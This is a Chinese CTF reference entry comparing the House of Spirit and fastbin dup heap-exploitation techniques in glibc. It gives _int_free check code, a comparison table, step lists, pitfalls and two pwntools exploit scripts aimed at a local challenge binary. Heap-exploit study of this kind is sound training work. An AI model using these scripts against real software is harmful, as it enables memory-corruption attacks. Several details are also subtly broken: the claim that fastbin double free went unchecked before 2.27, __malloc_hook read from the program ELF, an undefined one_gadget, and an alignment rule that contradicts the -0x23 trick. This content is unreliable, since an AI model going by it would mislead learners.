---
title: House of Spirit 与 fastbin dup —— 区别、选择与分工
category: pwn
tags: [house of spirit, fastbin dup, 伪造 chunk, 栈上 chunk, 任意分配]
signals: [程序只有 malloc 没有 free, 能写到栈变量或全局变量里, 能在栈上布置一个伪 chunk 头, 有一个 free 指针数组可以篡改, 题目没有 delete 功能但存在 double free, free 参数来自全局变量而不是固定索引]
difficulty: hard
source: "CTF-Wiki Fastbin Attack / how2heap house_of_spirit.c / fastbin_dup.c"
tools: [pwntools, gdb, pwndbg]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

### 1. House of Spirit 的题面特征

- 程序**只有 `malloc` 没有 `free`**，或者 `free` 的入参来自一个**可被覆盖的指针变量**（如栈上的 `free_ptr`、全局的 `chunk_list[i]`）。
- 能往**栈变量 / 全局数组**里写数据，而且写入内容自由（如 `read(0, &stack_buf, 0x100)`）。
- 需要一个「被 free 的指针」实际指向我们伪造的 chunk。
- 目标区域可写可对齐（`0x7fff...` 栈地址、`.bss` 地址）。
- 之后要连着 `malloc` 两次，让第二次返回**伪造 chunk 的位置**（比如 `__malloc_hook`、`main_ret`）。

### 2. fastbin dup 的题面特征

- 同一个指针可以 `free` 两次（`free(ptr); free(ptr);`），或 `free` 后数组没把指针置 NULL，且允许再次 free。
- 有 `show` 功能，能读出 `fd` 指针 —— 用来绕 2.31+ 的 `key` 检查。
- chunk 大小在 `0x20 ~ 0x80` 之间（fastbin 范围）。
- 最终同样是 `malloc` 两次拿到重叠/任意地址分配。

> **两者目标一致**（让 `malloc` 返回一个我们挑的地址），**触发方式不同**：Spirit 靠「伪造一个能通过 `_int_free` 校验的 chunk 并让它被 free」，fastbin dup 靠「同一个 chunk 被 free 两次，篡改 `fd`」。

## 二、原理

### 1. House of Spirit

`_int_free` 对一个 chunk 做的基本检查：

```c
/* 1. size 合理性 */
if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
    || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");

/* 2. size 不能小于 MINSIZE 也不能太大，且按 16 对齐 */
if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

/* 3. 若进 fastbin，还要卡 next chunk 的 size 范围（2.31+ 更严） */
if ((unsigned long)(size) <= (unsigned long)(get_max_fast())
    && (chunksize_nomask(chunk_at_offset(p, size)) <= CHUNK_HDR_SZ
        || chunksize(chunk_at_offset(p, size)) >= av->system_mem))
    malloc_printerr ("free(): invalid next size (fast)");
```

所以只要在目标地址（栈上的 `buf`、`.bss` 数组）处构造 `prev_size / size(如 0x40) / data`，
再让某个 `free` 调用的参数等于该地址，假 chunk 就会进 fastbin / tcache / small bin，之后 `malloc` 返回它。

**三个关键难点**：① 目标地址**必须可泄漏**（否则没法让 free 参数指过去）；
② 2.31+ 的 free 会检查 `next chunk` 的 size（`chunk_at_offset(p, size)` 需 `>= 0x10` 且 `< system_mem`），
所以要在 `addr + size` 处再伪造一个 size；③ 2.32+ 的 tcache `key` 检查不影响 Spirit（它走 free 路径）。

### 2. fastbin dup

```c
free(ptr);   // fastbin: ptr
free(ptr);   // 同一指针再 free —— 2.27 前无检查
```

2.31+ 之后 fastbin / tcache 都有检查：

- **fastbin**：`_int_free` 里 `old == p` 会报 `double free or corruption (fasttop)`；
  绕过：`free(a); free(b); free(a);`，中间插入另一块使 `p != old`。
- **tcache（2.29+）**：检查 `e->key == tcache`，需用 `show` 读出 `key` 改写，或 UAF 清掉 `key`。

拿到 `fd` 控制权后：

```
fastbin[0x40]:  A -> B -> A -> B -> ...
```

此时 `malloc` 一次返回 `A`，改写 `A->fd = target`，再 `malloc` 两次即可返回 `target`。

### 3. 两者的核心差异对照

| 维度 | House of Spirit | fastbin dup |
| --- | --- | --- |
| **本质** | 伪造一个 chunk，骗过 `free` 的合法性检查 | 让真实 chunk 被 free 两次，再篡改 `fd` |
| **前置条件** | 能控制 **free 的参数**，且能写目标地址 | 能对**同一指针 free 两次**（或 UAF） |
| **需要的漏洞** | 任意写 / 越界写栈变量 + 可篡改 free 指针 | double free / UAF |
| **是否要 heap 布局** | **不需要**（甚至不需要真实堆块） | **需要**，至少 2 个真实 fastbin chunk |
| **是否要泄漏** | 必须（要算栈地址） | fd 的泄漏有帮助但不是必须 |
| **glibc 版本敏感度** | 2.31+ 增加 next-size 检查 | 2.31+ 需要 `a,b,a` 顺序 + size 对齐 |
| **失败现象** | `free(): invalid size` / `invalid next size (fast)` | `double free or corruption (fasttop)` |
| **典型题** | 只有 malloc、free 参数来自全局指针的菜单题 | 带 `free` 且能重复 free 的菜单题 |

### 4. 与已有条目 `heap-fastbin-attack.md` 的分工

已有条目讲的是 **fastbin 基本利用框架**：链表结构、size 索引、`fd` 改写、`__malloc_hook` 定位
（`main_arena - 0x23` 技巧）与 2.27/2.31 版本差异。本篇只负责两个「快速拿任意分配」的特定手法：

- **House of Spirit**：不依赖 double free，重点是伪 chunk 怎么过 `_int_free` 校验（`next chunk` size）。
- **fastbin dup**：double free 的具体节奏与 2.31+ 的 `a,b,a` 绕法。

`fd` 改写后「怎么找 `__malloc_hook`、怎么算 `main_arena`」直接复用那篇，本篇不重复。

## 三、解题步骤

**House of Spirit 路线**：① 找到 free 参数可控处；② 泄漏目标地址；③ 在目标处构造伪 chunk
（`prev_size/size`，2.31+ 还要伪造 `next chunk` 的 size）；④ 让 free 参数等于它；⑤ `malloc` 两次拿回。

**fastbin dup 路线**：① 准备 3 个同尺寸 chunk；② `free(a); free(b); free(a);`（2.31+ 需插入 b）；
③ UAF 改 `a->fd = target`；④ 连续 `malloc` 三次，第三次返回 `target`。

## 四、可直接运行的 exp 脚本

### A. House of Spirit 示例（目标为栈上 `fake_chunk`）

```python
#!/usr/bin/env python3
# 场景：有一个可写全局指针 free_ptr，且能 read 到可控区
from pwn import *

context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')
context.log_level = 'info'
io = process(elf.path)

io.recvuntil(b'buf: ')
stack_buf = int(io.recvline().strip(), 16)     # 1. 泄漏栈地址
FAKE, SIZE = stack_buf, 0x40                   # 伪 chunk 落点与合法 size

fake = flat({                                  # 2. 布置伪 chunk
    0x00: 0,                                   # prev_size
    0x08: SIZE,                                # size = 0x40（16 对齐、>= MINSIZE）
    0x10: b'AAAA',
    SIZE: 0x21,                                # next chunk 的 size（2.31+ 必需）
}, length=SIZE + 0x10, filler=b'\x00')
io.send(b'1'); io.send(fake)                   # 写到栈上可控区

io.send(b'2'); io.send(p64(FAKE))              # 3. 让 free 的参数等于 FAKE
io.send(b'3'); io.sendline(b'0x30')            # 4. 第一次 malloc
io.send(b'3'); io.sendline(b'0x30')            #    第二次 malloc → 返回 FAKE
io.interactive()
```

### B. fastbin dup 示例

```python
from pwn import *
context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.27.so')
io = process(elf.path)
TARGET = elf.sym['__malloc_hook'] - 0x23     # 经典定位，按 libc 调整

def add(size, data):
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)
def edit(idx, data):
    io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)
def free(idx):
    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(idx).encode())

add(0x30, b'A' * 8)      # 0
add(0x30, b'B' * 8)      # 1
add(0x30, b'C' * 8)      # 2
free(0); free(1); free(0)   # 2.27：直接 free(0); free(0) 也可以
edit(0, p64(TARGET))        # 篡改 fd
add(0x30, b'X')             # 返回 chunk 0
add(0x30, b'Y')             # 返回 chunk 1
add(0x30, p64(one_gadget))  # 返回 TARGET，写入 one_gadget
io.interactive()
```

## 五、常见坑 / 变体

### House of Spirit 专属

1. **`free(): invalid size`**：`size` 必须 `>= MINSIZE(0x20)` 且 16 字节对齐；`0x30`、`0x40` 是常用值。
2. **`free(): invalid next size (fast)`（2.31+）**：必须在 `FAKE + size` 处伪造一个合法 next size（`0x10 ~ system_mem`）。
3. **`free(): invalid pointer`**：地址未 16 字节对齐，或落在不可写页。
4. **栈地址泄漏是硬门槛**：没有泄漏时，可用「部分覆写」把栈上指针低字节改到已对齐位置。
5. **`tcache` 优先**：2.26+ 的 `free` 先入 tcache，链语义变成 LIFO，仍可用，但 2.32+ 有 `key` 检查。
6. **`.bss` 版**：目标改成 `.bss` 上某段可控数据时，无需栈泄漏，只需要一次越界写；这类题非常常见。

### fastbin dup 专属

7. **`double free or corruption (fasttop)`**：直接 `free(a); free(a);` 在 2.31+ 会报，改成 `free(a); free(b); free(a);`。
8. **`target` 必须对齐**：`target & 0xf == 0`；否则 `malloc` 返回的指针非法。
9. **`target` 处的 size 也要合法**：虽然 fastbin 取出时不检查，但**下一次** `malloc`/`free` 会读它，通常借 `__malloc_hook - 0x23` 让 `size` 字段正好落在 `0x7f` 上。
10. **2.27 有 `tcache`**：如果题目 libc 是 2.27，`free` 先填 tcache（每类 7 个），要先把 tcache 填满才能触发 fastbin 逻辑。
11. **衔接**：`fd` 控制后的 `__malloc_hook` 定位与 one_gadget 用法见 `heap-fastbin-attack.md`。

## 六、参考来源

- [CTF-Wiki: Fastbin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/)
- [how2heap: house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_spirit.c)
- [how2heap: fastbin_dup.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup.c)
- [how2heap: fastbin_dup_consolidate.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_consolidate.c)
- [how2heap: tcache_poisoning.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c)
- [glibc 源码: malloc/malloc.c（_int_free 的 fastbin 校验）](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
